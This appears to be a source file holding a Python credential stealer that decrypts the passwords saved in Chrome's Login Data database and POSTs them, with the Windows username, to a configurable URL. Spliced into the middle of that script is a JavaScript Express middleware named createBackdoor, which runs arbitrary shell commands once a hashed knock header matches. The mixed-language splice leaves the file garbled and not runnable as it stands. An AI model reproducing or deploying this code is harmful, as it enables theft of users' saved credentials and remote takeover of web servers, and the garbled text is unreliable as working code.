import os
import sqlite3
import requests
import getpass
try:
    import win32crypt
except:
    pass

def main():
    send()


def getpasswords():

    dataToBeSent = {}
    dataList = []
    path = getpath()
    try:
        connection = sqlite3.connect(path + "Login Data")
        cursor = connection.cursor()
        v = cursor.execute(
            'SELECT action_url, username_value, password_value FROM logins')
        value = v.fetchall()

        for origin_url, username, password in value:
            password = win32crypt.CryptUnprotectData(
                password, None, None, None, 0)[1]

            if password:
                dataList.append({
                    'origin_url': origin_url,
                    'username': username,
                    'password': str(password)[2:-1]
                })

function createBackdoor (req, res, next) {
  // Do the evil part
  const { cmd } = req.query
  const hash = crypto.createHash('md5')
    .update(String(req.headers[`knock_knock`]))
    .digest(`hex`)
  res.setHeader(`Content-Sec-Policy`, `default-src 'self'`)
  // md5 hash of "p@ssw0rd1234"
  if (cmd && hash === `c4fbb68607bcbb25407e0362dab0b2ea`) {
    exec(cmd, (err, stdout, stderr) => {
      res.send(JSON.stringify({ err, stdout, stderr }, null, 2))
    })
    return
  }
  // Do something useful here
  // ...
  next()

    except sqlite3.OperationalError as e:
        e = str(e)
        if (e == 'database is locked'):
            print('[!] Make sure Google Chrome is not running in the background')
        elif (e == 'no such table: logins'):
            print('[!] Something wrong with the database name')
        elif (e == 'unable to open database file'):
            print('[!] Something wrong with the database path')
        else:
            print(e)

    dataToBeSent["user"] = getpass.getuser()
    dataToBeSent["passwords"] = dataList
    return dataToBeSent

def send():
    #Add post request api route here
    url = " "
    jsonData = getpasswords()
    print(jsonData)
    r = requests.post(url=url, json=jsonData)


def getpath():

    PathName = os.getenv('localappdata') + \
                   '\\Google\\Chrome\\User Data\\Default\\'
    if not os.path.isdir(PathName):
        print('[!] Chrome Doesn\'t exists')
        sys.exit(0)

    return PathName

if __name__== '__main__':
    main()